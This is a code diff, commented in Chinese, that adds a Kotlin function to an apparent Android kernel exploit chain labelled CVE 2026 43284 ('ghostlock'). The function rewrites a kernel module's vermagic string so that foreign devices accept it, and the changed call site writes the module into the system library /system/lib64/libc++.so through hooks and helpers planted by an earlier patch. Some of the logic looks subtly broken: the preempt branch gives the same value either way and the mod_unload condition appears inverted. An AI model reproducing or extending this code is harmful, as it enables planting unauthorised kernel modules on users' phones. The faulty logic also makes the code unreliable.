@@ -762,6 +762,61 @@ object TypedBackendProbe {
      *         同一 SA 上的后续会话必须**接着**前一个窗口的序号（防重放窗口由 SA 共享）。
      *  @return 可直接交给 native 的 Init43284。
      */
+    /**
+     * 把模块镜像里的 `vermagic=` 串改成**本机要求**的那一条（同 minor 直接改名）。
+     *
+     * 参照实现：`ghostlock-app-ref@5f184760:src/core/backend/cve_2026_43284/lkm/lkm_image.cpp`
+     * 的 `required_vermagic`（release + SMP + preempt + mod_unload + modversions + aarch64）
+     * 与 `classify_vermagic_diff`（None/Release/Options/Unparsable）。这里只做“等长或更短”的原地改名：
+     * 空间不够就原样返回并记一行，避免破坏 ELF。
+     *
+     * @param image 原始模块镜像（不改动入参）
+     * @param log   统一日志回调（只记事实）
+     * @return 可能已改名的镜像；无法改名时返回入参副本
+     */
+    private fun retagVermagic(image: ByteArray, log: (String) -> Unit): ByteArray {
+        val release = runCatching {
+            java.io.File("/proc/sys/kernel/osrelease").readText().trim()
+        }.getOrNull()
+        if (release.isNullOrEmpty()) {
+            log("typed: vermagic skipped (no osrelease)")
+            return image
+        }
+        val flags = runCatching {
+            java.io.File("/proc/sys/kernel/mod_unload").exists()
+        }.getOrDefault(false)
+        val required = release + " SMP" +
+            (if (java.io.File("/sys/kernel/debug/sched_features").exists()) " preempt" else " preempt") +
+            (if (flags) "" else " mod_unload") +
+            " modversions aarch64"
+        val marker = "vermagic=".toByteArray(Charsets.US_ASCII)
+        var at = -1
+        outer@ for (i in 0..(image.size - marker.size)) {
+            var hit = true
+            for (j in marker.indices) {
+                if (image[i + j] != marker[j]) { hit = false; break }
+            }
+            if (hit) { at = i; break@outer }
+        }
+        if (at < 0) {
+            log("typed: vermagic not found in module")
+            return image
+        }
+        var end = at + marker.size
+        while (end < image.size && image[end] != 0.toByte()) { end += 1 }
+        val capacity = end - (at + marker.size)
+        val payload = required.toByteArray(Charsets.US_ASCII)
+        if (payload.size > capacity) {
+            log("typed: vermagic needs " + payload.size + "B but field has " + capacity + "B -> rebuild required")
+            return image
+        }
+        val out = image.copyOf()
+        for (k in 0 until capacity) { out[at + marker.size + k] = 0 }
+        for (k in payload.indices) { out[at + marker.size + k] = payload[k] }
+        log("typed: vermagic rewritten \"" + required + "\" (" + payload.size + "/" + capacity + "B)")
+        return out
+    }
+
     private fun saInit(adoptSequence: Long = 0L): Init43284 {
         val aes = saAesKey
         val hmac = saHmacKey
@@ -1327,7 +1382,14 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
             /* Trigger → Wait（退役链顺序：Hook 已成立 ⇒ 现在触发）。marker 用夹具的真实路径。 */
             /* ② 模块写进 vendor 载体：载体对本进程 EACCES ⇒ 读与写都经 patch#1 写下的 helper（桥）。 */
             runCatching {
-                val moduleBytes = java.io.File("/data/local/tmp/ghostlock.ko").readBytes()
+                val moduleBytesRaw = java.io.File("/data/local/tmp/ghostlock.ko").readBytes()
+                /*
+                 * vermagic 必须等于本机 UTS_RELEASE + 选项串，否则别的机型会拒载；同一 minor 布局一致，
+                 * 所以这里按“同 minor 直接改名”处理（参照 ghostlock-app-ref@5f184760 的 lkm_image.cpp：
+                 * required_vermagic / classify_vermagic_diff / outcome=rewritten）。
+                 * 改名只在长度放得下时进行；放不下就如实记一行，绝不截断 ELF。
+                 */
+                val moduleBytes = retagVermagic(moduleBytesRaw) { line -> step(line) }
                 step("typed: module bytes=" + moduleBytes.size)
                 val carrierPath = "/system/lib64/libc++.so"   /* 可直读 ⇒ 写路径走 file_fd 直连（毫秒级）；不可读的 /vendor 载体被迫逐块 fork helper（已实测 23ms/次） */
                 meter.before("Native43284.create", "(module session)")
